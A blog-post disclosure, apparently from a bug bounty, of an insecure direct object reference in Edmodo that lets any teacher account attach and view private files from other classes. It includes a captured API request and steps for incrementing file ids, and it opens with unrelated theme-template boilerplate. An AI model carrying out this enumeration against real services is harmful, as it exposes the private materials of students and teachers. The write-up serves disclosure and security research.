---
layout: post
title:  "Edmodo — IDOR to view private files of any class"
author: "Rohan"
comments: true
---

Tale is a minimal [Jekyll](https://jekyllrb.com/) theme curated for storytellers. It is designed and developed by [myself](https://github.com/chesterhow/) for a friend who writes short stories.


## What is Edmodo ?

* Platform to connect teachers-students-parents . Kind of social networking for learning.

## Functionality

* Edmodo is having a functionality called classes
* A teacher can create a class and invite students to join the class
* Teachers generally upload their notes/assignments/files etc inside a class
* Classes are private & only those students who are having an invitation can access the content posted inside that class
* With this bug, I was able to access the private attachments of any class without being a member of it

## Proof Of Concept

1. From a teacher’s edmodo account,go to your class and capture the request for editing a post (The post should have an attachment)

2. The captured request will be like this :
```
PUT /messages/693960217?access_token=xyz&request_origin=react-web-app HTTP/1.1
Host: api.edmodo.com
Connection: close
Content-Length: 180
Accept: application/json
Origin: https://new.edmodo.com
User-Agent: Mozilla/5.0
Content-Type: application/json
Referer: https://new.edmodo.com/groups/my-class-1234
Accept-Language: en-US,en;q=0.9{“content”:{“id”:693960217,”text”:”Final notes”,”attachments”:{“files”:[{“id”:910143311}],”links”:[],”embeds”:[]}},”id”:693960217,”url”:”https://api.edmodo.com/messages/693960217"}
```
3. It is taking “files”:[{“id”:910143311}] parameter and attaching it in your post.

4. An attacker can change that id to any number and that file will be linked to his post

5. As a result,an attacker can view every single attachment posted in any private class/groups just by incrementing/decrementing that id
